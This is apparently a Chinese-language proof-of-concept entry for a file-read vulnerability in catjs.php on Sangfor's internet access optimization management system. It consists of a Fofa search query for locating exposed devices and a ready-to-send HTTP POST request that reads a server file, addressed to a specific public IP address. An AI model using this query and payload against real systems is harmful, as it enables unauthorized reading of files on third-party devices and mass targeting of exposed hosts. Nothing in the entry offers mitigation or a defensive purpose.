# 深信服上网优化管理系统 catjs.php 文件读取漏洞

    ## Fofa

```
title="SANGFOR上网优化管理"
```

## poc

```
POST /php/catjs.php HTTP/1.1
Host: 122.227.234.50
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 19

["./php/catjs.php"]
```
